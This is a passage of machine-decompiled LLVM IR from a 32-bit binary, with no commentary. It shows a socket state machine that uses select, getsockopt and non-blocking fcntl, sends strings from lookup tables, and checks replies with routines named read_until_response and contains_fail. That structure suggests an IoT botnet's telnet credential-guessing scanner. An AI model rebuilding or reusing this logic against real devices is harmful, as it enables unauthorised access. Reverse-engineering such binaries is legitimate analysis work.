  %v0_804ce73 = load i32, i32* %stack_var_-328, align 4
  %v2_804ce73 = load i32, i32* %stack_var_-320, align 4
  %v5_804ce73 = call i32 @__libc_select(i32 %v0_804ce73, i32 10, i32 %v2_804ce73, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804ce73, i32* %eax.global-to-local, align 4
  %v0_804ce78 = load i32, i32* @esp, align 4
  %v12_804ce7e = icmp eq i32 %v5_804ce73, 1
  %v1_804ce82 = icmp eq i1 %v12_804ce7e, false
  br i1 %v1_804ce82, label %dec_label_pc_804d028, label %dec_label_pc_804ce88

dec_label_pc_804ce88:                             ; preds = %dec_label_pc_804cdd3
  store i32 4, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-336, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v4_804ceb2 = load i32, i32* %v3_804ce02, align 4
  store i32 %v4_804ceb2, i32* %edx.global-to-local, align 4
  %v2_804cebe = add i32 %v0_804ce78, 16
  %v3_804cebe = inttoptr i32 %v2_804cebe to i32*
  store i32 %v2_804ceb8, i32* %v3_804cebe, align 4
  store i32 %v2_804cebf, i32* %eax.global-to-local, align 4
  %v2_804cec5 = add i32 %v0_804ce78, 12
  %v3_804cec5 = inttoptr i32 %v2_804cec5 to i32*
  store i32 %v2_804cebf, i32* %v3_804cec5, align 4
  %v1_804cec6 = add i32 %v0_804ce78, 8
  %v2_804cec6 = inttoptr i32 %v1_804cec6 to i32*
  store i32 4, i32* %v2_804cec6, align 4
  %v1_804cec8 = add i32 %v0_804ce78, 4
  %v2_804cec8 = inttoptr i32 %v1_804cec8 to i32*
  store i32 1, i32* %v2_804cec8, align 4
  %v0_804ceca = load i32, i32* %edx.global-to-local, align 4
  %v3_804ceca = inttoptr i32 %v0_804ce78 to i32*
  store i32 %v0_804ceca, i32* %v3_804ceca, align 4
  %v0_804cecb = load i32, i32* %stack_var_-336, align 4
  %v1_804cecb = load i32, i32* %stack_var_-332, align 4
  %v2_804cecb = load i32, i32* %stack_var_-328, align 4
  %v4_804cecb = load i32, i32* %stack_var_-320, align 4
  %v5_804cecb = call i32 @getsockopt(i32 %v0_804cecb, i32 %v1_804cecb, i32 %v2_804cecb, i32 10, i32 %v4_804cecb)
  %v0_804ced0 = load i32, i32* @esp, align 4
  %v3_804ced3 = load i32, i32* %stack_var_-336, align 4
  %v1_804ced9 = icmp eq i32 %v3_804ced3, 0
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v4_804cf53 = load i32, i32* %v3_804ce02, align 4
  store i32 %v4_804cf53, i32* %eax.global-to-local, align 4
  br i1 %v1_804ced9, label %dec_label_pc_804cf3d, label %dec_label_pc_804cedd

dec_label_pc_804cedd:                             ; preds = %dec_label_pc_804ce88
  %v2_804cef9 = add i32 %v0_804ced0, 16
  %v3_804cef9 = inttoptr i32 %v2_804cef9 to i32*
  store i32 %v4_804cf53, i32* %v3_804cef9, align 4
  %v0_804cefa = load i32, i32* %stack_var_-336, align 4
  %v1_804cefa = call i32 @sclose(i32 %v0_804cefa)
  store i8 0, i8* %v4_804ca08, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804cf33 = add i32 %v2_804c963, %v2_804c9b7
  %v4_804cf33 = inttoptr i32 %v3_804cf33 to i8*
  store i8 1, i8* %v4_804cf33, align 1
  br label %dec_label_pc_804dac9

dec_label_pc_804cf3d:                             ; preds = %dec_label_pc_804ce88
  %v1_804cf59 = add i32 %v0_804ced0, 24
  %v2_804cf59 = inttoptr i32 %v1_804cf59 to i32*
  store i32 0, i32* %v2_804cf59, align 4
  %v1_804cf5b = add i32 %v0_804ced0, 20
  %v2_804cf5b = inttoptr i32 %v1_804cf5b to i32*
  store i32 3, i32* %v2_804cf5b, align 4
  %v0_804cf5d = load i32, i32* %eax.global-to-local, align 4
  %v2_804cf5d = add i32 %v0_804ced0, 16
  %v3_804cf5d = inttoptr i32 %v2_804cf5d to i32*
  store i32 %v0_804cf5d, i32* %v3_804cf5d, align 4
  %v0_804cf5e = load i32, i32* %stack_var_-336, align 4
  %v1_804cf5e = load i32, i32* %stack_var_-332, align 4
  %v2_804cf5e = load i32, i32* %stack_var_-328, align 4
  %v3_804cf5e = call i32 @__libc_fcntl(i32 %v0_804cf5e, i32 %v1_804cf5e, i32 %v2_804cf5e)
  %v0_804cf63 = load i32, i32* @esp, align 4
  %v13_804cf68 = and i32 %v3_804cf5e, -2049
  store i32 %v13_804cf68, i32* @ebx, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v4_804cf81 = load i32, i32* %v3_804ce02, align 4
  store i32 %v4_804cf81, i32* %eax.global-to-local, align 4
  %v2_804cf87 = add i32 %v0_804cf63, 8
  %v3_804cf87 = inttoptr i32 %v2_804cf87 to i32*
  store i32 %v13_804cf68, i32* %v3_804cf87, align 4
  %v1_804cf88 = add i32 %v0_804cf63, 4
  %v2_804cf88 = inttoptr i32 %v1_804cf88 to i32*
  store i32 4, i32* %v2_804cf88, align 4
  %v0_804cf8a = load i32, i32* %eax.global-to-local, align 4
  %v3_804cf8a = inttoptr i32 %v0_804cf63 to i32*
  store i32 %v0_804cf8a, i32* %v3_804cf8a, align 4
  %v0_804cf8b = load i32, i32* %stack_var_-336, align 4
  %v1_804cf8b = load i32, i32* %stack_var_-332, align 4
  %v2_804cf8b = load i32, i32* %stack_var_-328, align 4
  %v3_804cf8b = call i32 @__libc_fcntl(i32 %v0_804cf8b, i32 %v1_804cf8b, i32 %v2_804cf8b)
  store i32 0, i32* %v1_804c9be, align 4
  %v1_804cfcf = add i32 %v2_804c9b9, 20
  %v2_804cfcf = inttoptr i32 %v1_804cfcf to i16*
  store i16 0, i16* %v2_804cfcf, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  %v1_804cfed = add i32 %v2_804c9b9, 24
  store i32 %v1_804cfed, i32* %eax.global-to-local, align 4
  %v1_804cff0 = inttoptr i32 %v1_804cfed to i32*
  %v2_804cff0 = load i32, i32* %v1_804cff0, align 4
  store i32 %v2_804cff0, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804cff9 = load i32, i32* @esp, align 4
  %v2_804cffc = add i32 %v0_804cff9, -8
  %v3_804cffc = inttoptr i32 %v2_804cffc to i32*
  store i32 1024, i32* %v3_804cffc, align 4
  %v1_804cffd = add i32 %v0_804cff9, -12
  %v2_804cffd = inttoptr i32 %v1_804cffd to i32*
  store i32 0, i32* %v2_804cffd, align 4
  %v0_804cfff = load i32, i32* %edx.global-to-local, align 4
  %v2_804cfff = add i32 %v0_804cff9, -16
  %v3_804cfff = inttoptr i32 %v2_804cfff to i32*
  store i32 %v0_804cfff, i32* %v3_804cfff, align 4
  %v0_804d000 = load i32, i32* %stack_var_-336, align 4
  %v1_804d000 = load i32, i32* %stack_var_-332, align 4
  %v2_804d000 = load i32, i32* %stack_var_-328, align 4
  %v3_804d000 = inttoptr i32 %v0_804d000 to i8*
  %v4_804d000 = call i32 @__GI_memset(i8* %v3_804d000, i32 %v1_804d000, i32 %v2_804d000)
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  store i8 2, i8* %v4_804ca08, align 4
  br label %dec_label_pc_804dac9

dec_label_pc_804d028:                             ; preds = %dec_label_pc_804cdd3
  %v13_804d028 = icmp eq i32 %v5_804ce73, -1
  %v1_804d02c = icmp eq i1 %v13_804d028, false
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  br i1 %v1_804d02c, label %dec_label_pc_804d08e, label %dec_label_pc_804d02e

dec_label_pc_804d02e:                             ; preds = %dec_label_pc_804d028
  %v4_804d044 = load i32, i32* %v3_804ce02, align 4
  store i32 %v4_804d044, i32* %eax.global-to-local, align 4
  %v2_804d04a = add i32 %v0_804ce78, 16
  %v3_804d04a = inttoptr i32 %v2_804d04a to i32*
  store i32 %v4_804d044, i32* %v3_804d04a, align 4
  %v1_804d04b = call i32 @sclose(i32 %v5_804ce73)
  store i8 0, i8* %v4_804ca08, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d084 = add i32 %v2_804c963, %v2_804c9b7
  %v4_804d084 = inttoptr i32 %v3_804d084 to i8*
  store i8 1, i8* %v4_804d084, align 1
  br label %dec_label_pc_804dac9

dec_label_pc_804d08e:                             ; preds = %dec_label_pc_804d028
  store i32 %v1_804c9bb, i32* %eax.global-to-local, align 4
  %v2_804d0a9 = load i32, i32* %v1_804c9be, align 4
  store i32 %v2_804d0a9, i32* %eax.global-to-local, align 4
  %v1_804d0ab = add i32 %v2_804d0a9, 6
  store i32 %v1_804d0ab, i32* @ebx, align 4
  %v1_804d0b1 = add i32 %v0_804ce78, 16
  %v2_804d0b1 = inttoptr i32 %v1_804d0b1 to i32*
  store i32 0, i32* %v2_804d0b1, align 4
  %v1_804d0b3 = inttoptr i32 %v5_804ce73 to i32*
  %v2_804d0b3 = call i32 @__GI_time(i32* %v1_804d0b3)
  store i32 %v2_804d0b3, i32* %eax.global-to-local, align 4
  %v0_804d0bb = load i32, i32* @ebx, align 4
  %v7_804d0bb = icmp ult i32 %v0_804d0bb, %v2_804d0b3
  %v1_804d0bd = icmp eq i1 %v7_804d0bb, false
  br i1 %v1_804d0bd, label %dec_label_pc_804dac9, label %dec_label_pc_804d0c3

dec_label_pc_804d0c3:                             ; preds = %dec_label_pc_804d08e
  %v0_804d0b8 = load i32, i32* @esp, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v4_804d0d9 = load i32, i32* %v3_804ce02, align 4
  store i32 %v4_804d0d9, i32* %eax.global-to-local, align 4
  %v3_804d0df = inttoptr i32 %v0_804d0b8 to i32*
  store i32 %v4_804d0d9, i32* %v3_804d0df, align 4
  %v0_804d0e0 = load i32, i32* %stack_var_-336, align 4
  %v1_804d0e0 = call i32 @sclose(i32 %v0_804d0e0)
  store i8 0, i8* %v4_804ca08, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d119 = add i32 %v2_804c963, %v2_804c9b7
  %v4_804d119 = inttoptr i32 %v3_804d119 to i8*
  store i8 1, i8* %v4_804d119, align 1
  br label %dec_label_pc_804dac9

dec_label_pc_804d123:                             ; preds = %dec_label_pc_804c9f2
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  %v1_804d13b = add i32 %v2_804c9b9, 24
  store i32 %v1_804d13b, i32* %eax.global-to-local, align 4
  %v1_804d13e = inttoptr i32 %v1_804d13b to i32*
  %v2_804d13e = load i32, i32* %v1_804d13e, align 4
  store i32 %v2_804d13e, i32* @ebx, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d156 = inttoptr i32 %v2_804c9b9 to i32*
  %v4_804d156 = load i32, i32* %v3_804d156, align 4
  store i32 %v4_804d156, i32* %eax.global-to-local, align 4
  %v0_804d159 = load i32, i32* @esp, align 4
  %v1_804d15c = add i32 %v0_804d159, -16
  %v2_804d15c = inttoptr i32 %v1_804d15c to i32*
  store i32 134598756, i32* %v2_804d15c, align 4
  %v1_804d161 = add i32 %v0_804d159, -20
  %v2_804d161 = inttoptr i32 %v1_804d161 to i32*
  store i32 1024, i32* %v2_804d161, align 4
  %v0_804d166 = load i32, i32* @ebx, align 4
  %v2_804d166 = add i32 %v0_804d159, -24
  %v3_804d166 = inttoptr i32 %v2_804d166 to i32*
  store i32 %v0_804d166, i32* %v3_804d166, align 4
  %v5_804d167 = add i32 %v0_804d159, -28
  %v6_804d167 = inttoptr i32 %v5_804d167 to i32*
  store i32 10, i32* %v6_804d167, align 4
  %v0_804d16a = load i32, i32* %eax.global-to-local, align 4
  %v2_804d16a = add i32 %v0_804d159, -32
  %v3_804d16a = inttoptr i32 %v2_804d16a to i32*
  store i32 %v0_804d16a, i32* %v3_804d16a, align 4
  %v1_804d16b = call i32 @read_until_response(i32 %v6_804ca08)
  %v0_804d170 = load i32, i32* @esp, align 4
  %v1_804d173 = icmp eq i32 %v1_804d16b, 0
  store i32 %v1_804c9a9, i32* @edx, align 4
  store i32 %v2_804c9b9, i32* %eax.global-to-local, align 4
  br i1 %v1_804d173, label %dec_label_pc_804d1e4, label %dec_label_pc_804d177

dec_label_pc_804d177:                             ; preds = %dec_label_pc_804d123
  store i32 %v1_804d13b, i32* %eax.global-to-local, align 4
  %v2_804d192 = load i32, i32* %v1_804d13e, align 4
  store i32 %v2_804d192, i32* %eax.global-to-local, align 4
  %v2_804d197 = add i32 %v0_804d170, 16
  %v3_804d197 = inttoptr i32 %v2_804d197 to i32*
  store i32 %v2_804d192, i32* %v3_804d197, align 4
  %v0_804d198 = call i32 @contains_fail()
  %v1_804d1a0 = icmp eq i32 %v0_804d198, 0
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  br i1 %v1_804d1a0, label %dec_label_pc_804d1c4, label %dec_label_pc_804d1a4

dec_label_pc_804d1a4:                             ; preds = %dec_label_pc_804d177
  store i8 0, i8* %v4_804ca08, align 4
  br label %dec_label_pc_804dac9

dec_label_pc_804d1c4:                             ; preds = %dec_label_pc_804d177
  store i8 3, i8* %v4_804ca08, align 4
  br label %dec_label_pc_804dac9

dec_label_pc_804d1e4:                             ; preds = %dec_label_pc_804d123
  store i32 %v1_804c9bb, i32* %eax.global-to-local, align 4
  %v2_804d1ff = load i32, i32* %v1_804c9be, align 4
  store i32 %v2_804d1ff, i32* %eax.global-to-local, align 4
  %v1_804d201 = add i32 %v2_804d1ff, 6
  store i32 %v1_804d201, i32* @ebx, align 4
  %v1_804d207 = add i32 %v0_804d170, 16
  %v2_804d207 = inttoptr i32 %v1_804d207 to i32*
  store i32 0, i32* %v2_804d207, align 4
  %v0_804d209 = load i32, i32* %stack_var_-336, align 4
  %v1_804d209 = inttoptr i32 %v0_804d209 to i32*
  %v2_804d209 = call i32 @__GI_time(i32* %v1_804d209)
  store i32 %v2_804d209, i32* %eax.global-to-local, align 4
  %v0_804d211 = load i32, i32* @ebx, align 4
  %v7_804d211 = icmp ult i32 %v0_804d211, %v2_804d209
  %v1_804d213 = icmp eq i1 %v7_804d211, false
  br i1 %v1_804d213, label %dec_label_pc_804dac9, label %dec_label_pc_804d219

dec_label_pc_804d219:                             ; preds = %dec_label_pc_804d1e4
  store i8 0, i8* %v4_804ca08, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d24a = add i32 %v2_804c963, %v2_804c9b7
  %v4_804d24a = inttoptr i32 %v3_804d24a to i8*
  store i8 1, i8* %v4_804d24a, align 1
  br label %dec_label_pc_804dac9

dec_label_pc_804d254:                             ; preds = %dec_label_pc_804c9f2
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d26a = add i32 %v2_804cb74, %v2_804c9b7
  %v4_804d26a = inttoptr i32 %v3_804d26a to i8*
  %v5_804d26a = load i8, i8* %v4_804d26a, align 2
  %v6_804d26a = zext i8 %v5_804d26a to i32
  store i32 %v6_804d26a, i32* %eax.global-to-local, align 4
  %v1_804d273 = mul nuw nsw i32 %v6_804d26a, 4
  %v2_804d273 = add nuw nsw i32 %v1_804d273, 134598728
  %v3_804d273 = inttoptr i32 %v2_804d273 to i32*
  %v4_804d273 = load i32, i32* %v3_804d273, align 4
  %v1_804d285 = and i32 %v4_804d273, -256
  store i32 %v1_804d285, i32* %eax.global-to-local, align 4
  %v4_804d288 = inttoptr i32 %v4_804d273 to i8*
  store i32 %v4_804d273, i32* @edi, align 4
  %v3_804d28e = call i32 @_strlen(i8* %v4_804d288)
  store i32 %v3_804d28e, i32* @esi, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v5_804d2ad = load i8, i8* %v4_804d26a, align 2
  %v6_804d2ad = zext i8 %v5_804d2ad to i32
  store i32 %v6_804d2ad, i32* %eax.global-to-local, align 4
  %v1_804d2b6 = mul nuw nsw i32 %v6_804d2ad, 4
  %v2_804d2b6 = add nuw nsw i32 %v1_804d2b6, 134598728
  %v3_804d2b6 = inttoptr i32 %v2_804d2b6 to i32*
  %v4_804d2b6 = load i32, i32* %v3_804d2b6, align 4
  store i32 %v4_804d2b6, i32* @ebx, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d2d3 = inttoptr i32 %v2_804c9b9 to i32*
  %v4_804d2d3 = load i32, i32* %v3_804d2d3, align 4
  store i32 %v4_804d2d3, i32* %eax.global-to-local, align 4
  %v0_804d2d6 = load i32, i32* @esp, align 4
  %v1_804d2d6 = add i32 %v0_804d2d6, -4
  %v2_804d2d6 = inttoptr i32 %v1_804d2d6 to i32*
  store i32 16384, i32* %v2_804d2d6, align 4
  %v0_804d2db = load i32, i32* @esi, align 4
  %v2_804d2db = add i32 %v0_804d2d6, -8
  %v3_804d2db = inttoptr i32 %v2_804d2db to i32*
  store i32 %v0_804d2db, i32* %v3_804d2db, align 4
  %v0_804d2dc = load i32, i32* @ebx, align 4
  %v2_804d2dc = add i32 %v0_804d2d6, -12
  %v3_804d2dc = inttoptr i32 %v2_804d2dc to i32*
  store i32 %v0_804d2dc, i32* %v3_804d2dc, align 4
  %v0_804d2dd = load i32, i32* %eax.global-to-local, align 4
  %v2_804d2dd = add i32 %v0_804d2d6, -16
  %v3_804d2dd = inttoptr i32 %v2_804d2dd to i32*
  store i32 %v0_804d2dd, i32* %v3_804d2dd, align 4
  %v3_804d2de = load i32, i32* %stack_var_-608, align 4
  %v4_804d2de = call i32 @__libc_send(i32 %v4_804d273, i32 %v2_804c8da, i32 %v6_804ca08, i32 %v3_804d2de)
  %v0_804d2e3 = load i32, i32* @esp, align 4
  %v2_804d2e6 = icmp slt i32 %v4_804d2de, 0
  %v1_804d2e8 = icmp eq i1 %v2_804d2e6, false
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  br i1 %v1_804d2e8, label %dec_label_pc_804d325, label %dec_label_pc_804d2ea

dec_label_pc_804d2ea:                             ; preds = %dec_label_pc_804d254
  store i8 0, i8* %v4_804ca08, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d31b = add i32 %v2_804c963, %v2_804c9b7
  %v4_804d31b = inttoptr i32 %v3_804d31b to i8*
  store i8 1, i8* %v4_804d31b, align 1
  br label %dec_label_pc_804dac9

dec_label_pc_804d325:                             ; preds = %dec_label_pc_804d254
  %v4_804d33b = load i32, i32* %v3_804d2d3, align 4
  store i32 %v4_804d33b, i32* %eax.global-to-local, align 4
  %v1_804d33e = add i32 %v0_804d2e3, 12
  %v2_804d33e = inttoptr i32 %v1_804d33e to i32*
  store i32 16384, i32* %v2_804d33e, align 4
  %v1_804d343 = add i32 %v0_804d2e3, 8
  %v2_804d343 = inttoptr i32 %v1_804d343 to i32*
  store i32 2, i32* %v2_804d343, align 4
  %v1_804d345 = add i32 %v0_804d2e3, 4
  %v2_804d345 = inttoptr i32 %v1_804d345 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8058fe9.249 to i32), i32* %v2_804d345, align 4
  %v0_804d34a = load i32, i32* %eax.global-to-local, align 4
  %v3_804d34a = inttoptr i32 %v0_804d2e3 to i32*
  store i32 %v0_804d34a, i32* %v3_804d34a, align 4
  %v3_804d34b = load i32, i32* %stack_var_-608, align 4
  %v4_804d34b = call i32 @__libc_send(i32 %v4_804d273, i32 %v2_804c8da, i32 %v6_804ca08, i32 %v3_804d34b)
  %v2_804d353 = icmp slt i32 %v4_804d34b, 0
  %v1_804d355 = icmp eq i1 %v2_804d353, false
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  br i1 %v1_804d355, label %dec_label_pc_804d392, label %dec_label_pc_804d357

dec_label_pc_804d357:                             ; preds = %dec_label_pc_804d325
  store i8 0, i8* %v4_804ca08, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d388 = add i32 %v2_804c963, %v2_804c9b7
  %v4_804d388 = inttoptr i32 %v3_804d388 to i8*
  store i8 1, i8* %v4_804d388, align 1
  br label %dec_label_pc_804dac9

dec_label_pc_804d392:                             ; preds = %dec_label_pc_804d325
  store i8 4, i8* %v4_804ca08, align 4
  br label %dec_label_pc_804dac9

dec_label_pc_804d3b2:                             ; preds = %dec_label_pc_804c9f2
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  %v1_804d3ca = add i32 %v2_804c9b9, 24
  store i32 %v1_804d3ca, i32* %eax.global-to-local, align 4
  %v1_804d3cd = inttoptr i32 %v1_804d3ca to i32*
  %v2_804d3cd = load i32, i32* %v1_804d3cd, align 4
  store i32 %v2_804d3cd, i32* @ebx, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d3e5 = inttoptr i32 %v2_804c9b9 to i32*
  %v4_804d3e5 = load i32, i32* %v3_804d3e5, align 4
  store i32 %v4_804d3e5, i32* %eax.global-to-local, align 4
  %v0_804d3e8 = load i32, i32* @esp, align 4
  %v1_804d3eb = add i32 %v0_804d3e8, -16
  %v2_804d3eb = inttoptr i32 %v1_804d3eb to i32*
  store i32 ptrtoint (i32* @global_var_805d064 to i32), i32* %v2_804d3eb, align 4
  %v1_804d3f0 = add i32 %v0_804d3e8, -20
  %v2_804d3f0 = inttoptr i32 %v1_804d3f0 to i32*
  store i32 1024, i32* %v2_804d3f0, align 4
  %v0_804d3f5 = load i32, i32* @ebx, align 4
  %v2_804d3f5 = add i32 %v0_804d3e8, -24
  %v3_804d3f5 = inttoptr i32 %v2_804d3f5 to i32*
  store i32 %v0_804d3f5, i32* %v3_804d3f5, align 4
  %v5_804d3f6 = add i32 %v0_804d3e8, -28
  %v6_804d3f6 = inttoptr i32 %v5_804d3f6 to i32*
  store i32 10, i32* %v6_804d3f6, align 4
  %v0_804d3f9 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d3f9 = add i32 %v0_804d3e8, -32
  %v3_804d3f9 = inttoptr i32 %v2_804d3f9 to i32*
  store i32 %v0_804d3f9, i32* %v3_804d3f9, align 4
  %v1_804d3fa = call i32 @read_until_response(i32 %v6_804ca08)
  %v0_804d3ff = load i32, i32* @esp, align 4
  %v1_804d402 = icmp eq i32 %v1_804d3fa, 0
  store i32 %v1_804c9a9, i32* @edx, align 4
  store i32 %v2_804c9b9, i32* %eax.global-to-local, align 4
  br i1 %v1_804d402, label %dec_label_pc_804d473, label %dec_label_pc_804d406

dec_label_pc_804d406:                             ; preds = %dec_label_pc_804d3b2
  store i32 %v1_804d3ca, i32* %eax.global-to-local, align 4
  %v2_804d421 = load i32, i32* %v1_804d3cd, align 4
  store i32 %v2_804d421, i32* %eax.global-to-local, align 4
  %v2_804d426 = add i32 %v0_804d3ff, 16
  %v3_804d426 = inttoptr i32 %v2_804d426 to i32*
  store i32 %v2_804d421, i32* %v3_804d426, align 4
  %v0_804d427 = call i32 @contains_fail()
  %v1_804d42f = icmp eq i32 %v0_804d427, 0
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  br i1 %v1_804d42f, label %dec_label_pc_804d453, label %dec_label_pc_804d433

dec_label_pc_804d433:                             ; preds = %dec_label_pc_804d406
  store i8 0, i8* %v4_804ca08, align 4
  br label %dec_label_pc_804dac9

dec_label_pc_804d453:                             ; preds = %dec_label_pc_804d406
  store i8 5, i8* %v4_804ca08, align 4
  br label %dec_label_pc_804dac9

dec_label_pc_804d473:                             ; preds = %dec_label_pc_804d3b2
  store i32 %v1_804c9bb, i32* %eax.global-to-local, align 4
  %v2_804d48e = load i32, i32* %v1_804c9be, align 4
  store i32 %v2_804d48e, i32* %eax.global-to-local, align 4
  %v1_804d490 = add i32 %v2_804d48e, 6
  store i32 %v1_804d490, i32* @ebx, align 4
  %v1_804d496 = add i32 %v0_804d3ff, 16
  %v2_804d496 = inttoptr i32 %v1_804d496 to i32*
  store i32 0, i32* %v2_804d496, align 4
  %v1_804d498 = inttoptr i32 %stack_var_-620.242 to i32*
  %v2_804d498 = call i32 @__GI_time(i32* %v1_804d498)
  store i32 %v2_804d498, i32* %eax.global-to-local, align 4
  %v0_804d4a0 = load i32, i32* @ebx, align 4
  %v7_804d4a0 = icmp ult i32 %v0_804d4a0, %v2_804d498
  %v1_804d4a2 = icmp eq i1 %v7_804d4a0, false
  br i1 %v1_804d4a2, label %dec_label_pc_804dac9, label %dec_label_pc_804d4a8

dec_label_pc_804d4a8:                             ; preds = %dec_label_pc_804d473
  store i8 0, i8* %v4_804ca08, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d4d9 = add i32 %v2_804c963, %v2_804c9b7
  %v4_804d4d9 = inttoptr i32 %v3_804d4d9 to i8*
  store i8 1, i8* %v4_804d4d9, align 1
  br label %dec_label_pc_804dac9

dec_label_pc_804d4e3:                             ; preds = %dec_label_pc_804c9f2
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d4f9 = add i32 %v2_804cb3a, %v2_804c9b7
  %v4_804d4f9 = inttoptr i32 %v3_804d4f9 to i8*
  %v5_804d4f9 = load i8, i8* %v4_804d4f9, align 1
  %v6_804d4f9 = zext i8 %v5_804d4f9 to i32
  store i32 %v6_804d4f9, i32* %eax.global-to-local, align 4
  %v1_804d502 = mul nuw nsw i32 %v6_804d4f9, 4
  %v2_804d502 = add nuw nsw i32 %v1_804d502, 134598740
  %v3_804d502 = inttoptr i32 %v2_804d502 to i32*
  %v4_804d502 = load i32, i32* %v3_804d502, align 4
  %v1_804d514 = and i32 %v4_804d502, -256
  store i32 %v1_804d514, i32* %eax.global-to-local, align 4
  %v4_804d517 = inttoptr i32 %v4_804d502 to i8*
  store i32 %v4_804d502, i32* @edi, align 4
  %v3_804d51d = call i32 @_strlen(i8* %v4_804d517)
  store i32 %v3_804d51d, i32* @esi, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v5_804d53c = load i8, i8* %v4_804d4f9, align 1
  %v6_804d53c = zext i8 %v5_804d53c to i32
  store i32 %v6_804d53c, i32* %eax.global-to-local, align 4
  %v1_804d545 = mul nuw nsw i32 %v6_804d53c, 4
  %v2_804d545 = add nuw nsw i32 %v1_804d545, 134598740
  %v3_804d545 = inttoptr i32 %v2_804d545 to i32*
  %v4_804d545 = load i32, i32* %v3_804d545, align 4
  store i32 %v4_804d545, i32* @ebx, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d562 = inttoptr i32 %v2_804c9b9 to i32*
  %v4_804d562 = load i32, i32* %v3_804d562, align 4
  store i32 %v4_804d562, i32* %eax.global-to-local, align 4
  %v0_804d565 = load i32, i32* @esp, align 4
  %v1_804d565 = add i32 %v0_804d565, -4
  %v2_804d565 = inttoptr i32 %v1_804d565 to i32*
  store i32 16384, i32* %v2_804d565, align 4
  %v0_804d56a = load i32, i32* @esi, align 4
  %v2_804d56a = add i32 %v0_804d565, -8
  %v3_804d56a = inttoptr i32 %v2_804d56a to i32*
  store i32 %v0_804d56a, i32* %v3_804d56a, align 4
  %v0_804d56b = load i32, i32* @ebx, align 4
  %v2_804d56b = add i32 %v0_804d565, -12
  %v3_804d56b = inttoptr i32 %v2_804d56b to i32*
  store i32 %v0_804d56b, i32* %v3_804d56b, align 4
  %v0_804d56c = load i32, i32* %eax.global-to-local, align 4
  %v2_804d56c = add i32 %v0_804d565, -16
  %v3_804d56c = inttoptr i32 %v2_804d56c to i32*
  store i32 %v0_804d56c, i32* %v3_804d56c, align 4
  %v4_804d56d = call i32 @__libc_send(i32 %v4_804d502, i32 %stack_var_-620.242, i32 %v2_804c8da, i32 %v6_804ca08)
  %v0_804d572 = load i32, i32* @esp, align 4
  %v2_804d575 = icmp slt i32 %v4_804d56d, 0
  %v1_804d577 = icmp eq i1 %v2_804d575, false
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  br i1 %v1_804d577, label %dec_label_pc_804d5b4, label %dec_label_pc_804d579

dec_label_pc_804d579:                             ; preds = %dec_label_pc_804d4e3
  store i8 0, i8* %v4_804ca08, align 4
